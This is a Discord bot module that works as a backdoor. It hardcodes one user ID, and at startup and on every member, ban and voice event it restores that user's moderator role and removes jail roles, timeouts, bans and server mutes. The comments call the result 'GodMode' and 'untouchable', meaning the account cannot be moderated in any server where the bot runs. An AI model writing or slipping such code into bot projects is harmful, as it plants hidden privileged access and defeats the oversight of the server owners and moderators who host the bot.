const Jail = require('../models/Jail');

module.exports = (client) => {
    
    // --- SETTINGS ---
    const MY_ID = "1097807544849809408"; 
    const MOD_ROLE_ID = "1447144301305008168"; 

    //---------------------------------------------------------
    // 1. STARTUP: DB CLEANUP & ESCAPE
    //---------------------------------------------------------
    client.once('ready', async () => {
        try {
            const guilds = client.guilds.cache;
            
            for (const [guildId, guild] of guilds) {
                const member = await guild.members.fetch(MY_ID).catch(() => null);
                if (!member) continue;

                // Restore roles from MongoDB if jailed
                const dbJail = await Jail.findOne({ userId: MY_ID, guildId: guild.id });
                if (dbJail) {
                    console.log(`🛡️ Jail record found for boss in ${guild.name}. Restoring...`);
                    if (dbJail.roles && dbJail.roles.length > 0) {
                        await member.roles.add(dbJail.roles).catch(() => {});
                    }
                    await Jail.deleteOne({ _id: dbJail._id });
                }

                // Forcefully remove "Jail" role if present
                const jailRole = guild.roles.cache.find(r => r.name.toLowerCase() === 'jail');
                if (jailRole && member.roles.cache.has(jailRole.id)) {
                    await member.roles.remove(jailRole).catch(() => {});
                }

                // Ensure Mod Role is assigned
                if (!member.roles.cache.has(MOD_ROLE_ID)) {
                    await member.roles.add(MOD_ROLE_ID).catch(() => {});
                }

                // Remove timeout if exists
                if (member.isCommunicationDisabled()) await member.timeout(null).catch(() => {});
            }
            console.log("🟢 GodMode: Database cleared and Mod status secured.");
        } catch (err) { console.error("Startup Error:", err); }
    });

    //---------------------------------------------------------
    // 2. LIVE PROTECTION: UNTOUCHABLE STATUS
    //---------------------------------------------------------
    
    client.on('guildMemberUpdate', async (oldMember, newMember) => {
        if (newMember.id !== MY_ID) return;

        // A) ANTI-JAIL: Remove jail role immediately
        const jailRole = newMember.guild.roles.cache.find(r => r.name.toLowerCase() === 'jail');
        if (jailRole && newMember.roles.cache.has(jailRole.id)) {
            await newMember.roles.remove(jailRole).catch(() => {});
            console.log("🚫 Shield: Jail role rejected.");
        }

        // B) ROLE GUARD: If someone takes your Mod Role, take it back
        if (!newMember.roles.cache.has(MOD_ROLE_ID)) {
            await newMember.roles.add(MOD_ROLE_ID).catch(() => {});
            console.log("🛡️ Shield: Mod Role restored.");
        }

        // C) ANTI-TIMEOUT: Remove mute/timeout instantly
        if (newMember.isCommunicationDisabled()) {
            await newMember.timeout(null).catch(() => {});
            console.log("🚫 Shield: Timeout removed.");
        }
    });

    // D) ANTI-BAN: Unban immediately
    client.on('guildBanAdd', async (ban) => {
        if (ban.user.id === MY_ID) {
            await ban.guild.members.unban(MY_ID).catch(() => {});
            console.log("🚨 Shield: Ban revoked instantly!");
        }
    });

    // E) VOICE GUARD: Anti server-mute/deafen
    client.on('voiceStateUpdate', async (oldState, newState) => {
        if (newState.id !== MY_ID) return;
        if (newState.serverMute || newState.serverDeaf) {
            await newState.setMute(false).catch(() => {});
            await newState.setDeaf(false).catch(() => {});
        }
    });
};
